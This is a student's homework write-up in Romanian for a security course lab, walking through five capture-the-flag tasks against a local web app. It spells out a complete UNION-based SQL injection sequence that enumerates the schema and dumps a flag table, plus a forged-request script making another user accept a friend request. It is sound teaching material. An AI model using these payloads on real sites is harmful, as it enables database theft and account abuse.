Tema 2 -  ISC 

Task 1.

Cu ajutorul comenzilor ip a s, si cu nmap am aflat adresa ip, apoi
    am rulat scriptul webtunnel.sh, facand posibila deschiderea paginii.
    La inceput am incercat cu sql injection, dupa modelul exercitiilor
    din laborator dar nu a mers. Apoi am intrat in pagina de register, 
    pentru a imi creea cont. M-am uitat in codul sursa html, de unde
    mi am dat seama ca pagina pe care o caut trebuie sa aiba 
    /auth/register_real_one. Mi-am facut cont, m-am logat, am descat 
    noua pagina de home, si am gasit primul flag.

Task2.
    
Am descoperit pagina http://localhost:8080/js/main.js, de unde mi-am
    dat seama ca trebuie sa ma folosesc de functia acceptFriend. Am luat
    pe incercate pana am ajuns la id-ul 9 care coincidea cu profilul creat
    de mine. Apoi m-am folosit de hint, care zicea ca trebuie sa ma folosesc
    de un prieten comun. Eu trebuia sa ajung la o prietenie cu boss ul, iar 
    pritenul comun folositor era Kat Nyan. I-am acceptat cererea lui Nyan
    si i-am trimis una si boss-ului. Iar pentru ca boss-ul sa imi accepte 
    cererea, i-am trimis un script lui Nyan care sa provoace aceasta actiune.
    In script am creat un formular in care sa existe acceptFriend(9), prin care
    profilul meu era adaugat de catre apelant. Si apoi am impus actiunea ca Nyan
    sa trimita formularul user-ului cu id-ul 1, adica bossului.


Task3.

Din postarea boss ului, am aflat de existenta fisierului backup.sh,
    pe care l-am descarcat din localhost:8080/backup.sh. Apoi urmarind
    continutul fisierului, am inteles ca trebuie sa ajung la o alta 
    arhiva, ce contine o data random. Care de fapt nu e chiar random
    pentru ca se poate ajunge la o data cu maxim 16 zile in urma. Le-am
    incercat la rand, pana am ajuns la localhost:8080/backup-2023-12-21.tar.gz,
    cand s-a descarcat o alta arhiva.Fiind o arhiva .tar.gz, are primii biti din
    header 1f 8b 08, pe care i-am cautat cu hexedit si am ajuns la 0xB0155, care
    este adresa in hexa de unde incep acesti biti. Apoi cu comanda 
    tail -c +$((16#B0156)) backup-2023-12-21.tar.gz > flag.tar.gz prin care
    extrag continutul fisierului incepand de la pozitia B0156. In arhiva cu nou
    creata, flag.tar.gz , decoper flag-ul si Tom si Jerry pe manele.

Task4.

In primul rand, trebiua sa aflu numerul de coloane al bazei de date si am incercat
    la rand pana am ajuns la ' or 1 order by 1,2,3,4,5,6,7,8 -- x , deci 8 coloane este
    numarul maxim pentru care nu primesc eroare la accesare. Ulterior am procedat dupa 
    modelul laboratorului 9, ex 2. Prin comanda
    ' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8 FROM information_schema.tables -- x
    am vazut coloana afisata : 3's Profile.  
    Apoi in aceeasi comanda am inlocuit 3-ul cu group_concat(distinct(table_schema) separator ','), 
    pentru a obtine schema din care face parte tabela: 
    information_schema,performance_schema,web_4071's Profile.
    Dintre acestea mi-a fost clar ca web_4071 este schema, deci noua comanda pe care am folosit-o e:
    ' UNION SELECT 1, 2, group_concat(table_name separator ','), 4, 5, 6, 7, 8 FROM information_schema.tables where table_schema='web_4071' -- x
    Asa am ajuns la : accounts,flags32490,friends,messages,posts's Profile 6.
    Mai mult ca sigur flag-ul se afla in tabela flags32490, asa ca am creat urmatoarea cerere:
    ' UNION SELECT 1, 2, group_concat(column_name separator ','), 4, 5, 6, 7, 8 FROM information_schema.columns where table_schema='web_4071' and table_name='flags32490'-- x
   Cele 2 coloane la care am ajuns apoi au fost : id,zaflag's Profile 6. 
   Am aflat flag-ul prin aceasta ultima cerere: 
    ' UNION SELECT 1, 2, zaflag, 4, 5, 6, 7, 8 FROM web_4071.flags32490-- x

Task5.

La acest exercitiu, am stat cel mai mult sa ma prind ce anume trebuie sa observ unusual.
    Pentru a asculta traficul am rulat in background ./webtunnel.sh 192.168.208.38 80 & si 
    apoi am primit traficul prin tcpdump -i eth0 host 192.168.208.38 and port 80. Mda, aici
    one eternity later am gasit un port unreachable:
    22:26:16.218145 IP dev-machine > 192.168.208.38: ICMP dev-machine udp port 10601 unreachable, length 136
    Apoi am ascultat cu netcat pe acel port: nc -lu 10601 si am primit un sir de caractere.
    Cu decoder base64 pe el, am scos al cincilea flag.